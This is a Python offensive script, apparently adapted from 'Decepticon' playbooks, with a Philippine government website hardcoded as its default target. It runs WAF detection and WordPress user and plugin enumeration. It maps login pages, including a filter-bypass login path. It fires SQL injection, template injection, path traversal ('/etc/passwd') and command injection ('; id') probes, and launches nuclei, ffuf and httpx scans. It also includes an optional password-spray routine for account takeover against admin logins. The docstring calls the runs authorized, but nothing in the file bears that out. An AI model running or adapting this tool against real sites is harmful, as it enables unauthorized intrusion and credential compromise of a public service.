#!/usr/bin/env python3
"""
Decepticon-style full attack runner for authorized engagements.
Implements skill playbooks from PurpleAILAB/Decepticon (web-recon, cms-scanning,
waf-detection, exploit/web probes) without requiring Docker/LLM stack.

Usage:
  python3 decepticon_attack_runner.py https://lto.gov.ph
"""

import json
import os
import re
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOOLS_BIN = Path(__file__).parent.parent / 'decepticon-tools' / 'bin'
TARGET_DEFAULT = 'https://lto.gov.ph'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
HEADERS = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


def env():
    e = os.environ.copy()
    e['PATH'] = f'{TOOLS_BIN}:{e.get("PATH", "")}'
    return e


def run_cmd(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, env=env())
        return {'cmd': cmd, 'exit': r.returncode, 'stdout': r.stdout[-8000:], 'stderr': r.stderr[-2000:]}
    except subprocess.TimeoutExpired:
        return {'cmd': cmd, 'error': 'timeout'}
    except Exception as exc:
        return {'cmd': cmd, 'error': str(exc)}


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    return s


def waf_detection(base):
    s = sess()
    findings = {'headers': {}, 'waf_indicators': [], 'cloudflare_challenge': False}
    r = s.get(base, timeout=20)
    hdrs = {k.lower(): v for k, v in r.headers.items()}
    if r.status_code == 403 and 'cf-mitigated' in hdrs:
        findings['cloudflare_challenge'] = True
        findings['waf_indicators'].append('Cloudflare Bot Challenge (403)')
    for h in ['server', 'via', 'x-amz-cf-id', 'x-amz-cf-pop', 'x-cache', 'cf-ray', 'x-cdn']:
        if h in {k.lower(): v for k, v in r.headers.items()}:
            findings['headers'][h] = r.headers.get(h) or r.headers.get(h.title())
    hdrs = {k.lower(): v for k, v in r.headers.items()}
    if 'x-amz-cf-id' in hdrs or 'cf-ray' in hdrs:
        findings['waf_indicators'].append('CloudFront/CDN')
    if 'awselb' in hdrs.get('server', '').lower():
        findings['waf_indicators'].append('AWS ELB')
    # sqli probe for WAF block
    r2 = s.get(base + "/?id=1' OR '1'='1", timeout=15)
    findings['sqli_probe_status'] = r2.status_code
    findings['wafw00f'] = run_cmd(f'pip show wafw00f >/dev/null 2>&1 && wafw00f {base} 2>&1 || echo wafw00f-not-installed', 60)
    return findings


def cms_wordpress(base):
    s = sess()
    out = {'checks': {}, 'users': [], 'plugins': []}
    checks = {
        'wp_json_users': '/wp-json/wp/v2/users',
        'wp_json': '/wp-json/',
        'xmlrpc': '/xmlrpc.php',
        'readme': '/readme.html',
        'login': '/wp-login.php',
        'login_bypass': '/wp%2Dlogin.php',
        'author_1': '/?author=1',
        'install_php': '/wp-admin/install.php',
        'upgrade_php': '/wp-admin/upgrade.php',
        'repair_php': '/wp-admin/maint/repair.php',
    }
    for name, path in checks.items():
        try:
            r = s.get(base + path, timeout=15, allow_redirects=False)
            out['checks'][name] = {'status': r.status_code, 'len': len(r.text or ''), 'location': r.headers.get('Location')}
        except requests.RequestException as e:
            out['checks'][name] = {'error': str(e)[:80]}

    try:
        r = s.get(base + '/wp-json/wp/v2/users', timeout=15)
        if r.status_code == 200:
            out['users'] = r.json()
    except Exception:
        pass

    plugins = ['elementor', 'elementor-pro', 'duplicate-page', 'redirection', 'ht-mega-for-elementor',
               'wpdatatables', 'add-search-to-menu', 'astra-sites']
    for pl in plugins:
        r = s.get(f'{base}/wp-content/plugins/{pl}/readme.txt', timeout=10)
        if r.status_code == 200:
            v = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.I)
            out['plugins'].append({'name': pl, 'version': v.group(1) if v else '?'})
    return out


def exploit_probes(base):
    s = sess()
    probes = {}
    tests = [
        ('sqli', f"{base}/?id=1'", lambda t: 'sql' in t.lower() or 'syntax' in t.lower()),
        ('ssti', f"{base}/?s={{7*7}}", lambda t: '49' in t),
        ('lfi', f"{base}/?file=../../../etc/passwd", lambda t: 'root:' in t),
        ('cmdi', f"{base}/?cmd=;id", lambda t: 'uid=' in t),
        ('graphql', f"{base}/graphql", None),
        ('wp_json_batch', f"{base}/wp-json/batch/v1", None),
    ]
    for name, url, detector in tests:
        try:
            if name == 'graphql':
                r = s.post(url, json={'query': '{ __typename }'}, timeout=12)
            else:
                r = s.get(url, timeout=12, allow_redirects=False)
            hit = detector(r.text) if detector else False
            probes[name] = {'status': r.status_code, 'len': len(r.text or ''), 'hit': hit}
        except requests.RequestException as e:
            probes[name] = {'error': str(e)[:60]}
    return probes


def auth_mapping(base):
    s = sess()
    paths = ['/wp-login.php', '/wp%2Dlogin.php', '/login', '/admin', '/wp-admin/',
             '/wp-login.php?action=lostpassword', '/wp%2Dlogin.php?action=lostpassword',
             '/wp-login.php?action=register']
    results = []
    for p in paths:
        try:
            r = s.get(base + p, timeout=12, allow_redirects=False)
            login = 'user_login' in (r.text or '').lower()
            results.append({'path': p, 'status': r.status_code, 'login_form': login})
        except requests.RequestException:
            pass
    return results


def httpx_scan(base):
    host = urlparse(base).netloc
    out_dir = Path('readyTouse/decepticon')
    out_dir.mkdir(parents=True, exist_ok=True)
    out = out_dir / f'httpx_{host}.txt'
    return run_cmd(f'echo "{base}" | httpx -silent -status-code -title -tech-detect -follow-redirects -o {out} 2>&1', 120)


def nuclei_scan(base):
    host = urlparse(base).netloc
    out_dir = Path('readyTouse/decepticon')
    out_dir.mkdir(parents=True, exist_ok=True)
    out = out_dir / f'nuclei_{host}.jsonl'
    # WordPress + exposure + misconfig + cve tags
    cmd = (
        f'nuclei -u "{base}" -tags wordpress,wp,exposure,misconfig,cve,tech '
        f'-severity critical,high,medium -jsonl -o {out} -silent -timeout 10 -retries 1 2>&1'
    )
    return run_cmd(cmd, 600)


def ffuf_dirs(base):
    host = urlparse(base).netloc
    out_dir = Path('readyTouse/decepticon')
    wordlist = '/tmp/decepticon-dirs.txt'
    if not Path(wordlist).exists():
        Path(wordlist).write_text('\n'.join([
            'wp-admin', 'wp-login.php', 'wp-json', 'wp-content', 'wp-includes',
            'xmlrpc.php', 'readme.html', 'license.txt', '.env', 'backup', 'backup.zip',
            'wp-config.php.bak', 'admin', 'login', 'api', 'graphql', 'uploads',
            'installer.php', 'dup-installer', 'debug.log', '.git', 'phpinfo.php',
            'wp-cron.php', 'wp-signup.php', 'author', 'feed', 'sitemap.xml',
        ]))
    out = out_dir / f'ffuf_{host}.json'
    url = base.rstrip('/') + '/FUZZ'
    return run_cmd(
        f'ffuf -u "{url}" -w {wordlist} -mc 200,301,302,403 -fc 404 -t 20 -timeout 10 -o {out} -of json -s 2>&1',
        180,
    )


def ato_spray(base, users, passwords, paths):
    s = sess()
    success = None
    attempts = 0
    for path in paths:
        for user in users:
            for pwd in passwords:
                attempts += 1
                try:
                    r = s.post(base + path, data={
                        'log': user, 'pwd': pwd, 'wp-submit': 'Log In',
                        'redirect_to': base + '/wp-admin/', 'testcookie': '1',
                    }, timeout=10, allow_redirects=False)
                    if any('wordpress_logged_in' in c.name for c in s.cookies):
                        success = {'user': user, 'password': pwd, 'path': path}
                        return {'success': success, 'attempts': attempts}
                    s.cookies.clear()
                except requests.RequestException:
                    pass
    return {'success': success, 'attempts': attempts}


def main():
    base = sys.argv[1].strip() if len(sys.argv) > 1 else TARGET_DEFAULT
    if not base.startswith('http'):
        base = 'https://' + base
    base = base.rstrip('/')

    print(f'\n=== Decepticon Attack Runner ===\nTarget: {base}\n')
    report = {
        'meta': {
            'target': base,
            'decepticon_ref': 'PurpleAILAB/Decepticon@2be00f6',
            'mode': 'skill-playbook-runner (no Docker/LLM)',
            'timestamp': datetime.now(timezone.utc).isoformat(),
        },
        'phases': {},
    }

    print('[1/8] WAF detection...')
    report['phases']['waf_detection'] = waf_detection(base)

    print('[2/8] CMS / WordPress scanning...')
    report['phases']['cms_wordpress'] = cms_wordpress(base)

    print('[3/8] Auth surface mapping...')
    report['phases']['auth_mapping'] = auth_mapping(base)

    print('[4/8] Exploit quick probes (sqli/ssti/lfi/graphql)...')
    report['phases']['exploit_probes'] = exploit_probes(base)

    print('[5/8] httpx tech detect...')
    report['phases']['httpx'] = httpx_scan(base)

    print('[6/8] ffuf directory fuzz...')
    report['phases']['ffuf'] = ffuf_dirs(base)

    print('[7/8] nuclei vulnerability scan (wordpress+cve tags)...')
    report['phases']['nuclei'] = nuclei_scan(base)

    print('[8/8] ATO credential spray (skipped — set ATO_SPRAY=1 to enable)...')
    if os.environ.get('ATO_SPRAY') == '1':
        users = ['admin', 'administrator', 'webmaster']
        passwords = open('/tmp/top10k.txt').read().splitlines()[:100] if Path('/tmp/top10k.txt').exists() else ['admin', 'password']
        paths = ['/wp-login.php', '/wp%2Dlogin.php', '/admin/login', '/login']
        report['phases']['ato_spray'] = ato_spray(base, users, passwords, paths)
    else:
        report['phases']['ato_spray'] = {'skipped': True, 'reason': 'set ATO_SPRAY=1 to enable'}

    out_json = Path('readyTouse/decepticon-attack-report.json')
    out_json.parent.mkdir(parents=True, exist_ok=True)
    with open(out_json, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, default=str)

    # Parse nuclei results
    host = urlparse(base).netloc
    nuclei_file = Path(f'readyTouse/decepticon/nuclei_{host}.jsonl')
    nuclei_hits = []
    if nuclei_file.exists():
        for line in nuclei_file.read_text().splitlines():
            if line.strip():
                try:
                    nuclei_hits.append(json.loads(line))
                except json.JSONDecodeError:
                    pass

    summary = {
        'waf': report['phases']['waf_detection'].get('waf_indicators'),
        'wp_users': len(report['phases']['cms_wordpress'].get('users', [])),
        'plugins': report['phases']['cms_wordpress'].get('plugins'),
        'login_blocked': report['phases']['cms_wordpress']['checks'].get('login', {}).get('status') == 403,
        'bypass_blocked': report['phases']['cms_wordpress']['checks'].get('login_bypass', {}).get('status') == 403,
        'nuclei_findings': len(nuclei_hits),
        'nuclei_critical_high': [h.get('info', {}).get('name') for h in nuclei_hits if h.get('info', {}).get('severity') in ('critical', 'high')][:20],
        'ato_success': report['phases']['ato_spray'].get('success'),
        'ato_attempts': report['phases']['ato_spray'].get('attempts'),
    }
    print('\n=== SUMMARY ===')
    print(json.dumps(summary, indent=2))
    print(f'\nFull report: {out_json}')
    if nuclei_hits:
        print(f'Nuclei hits: {nuclei_file}')


if __name__ == '__main__':
    main()
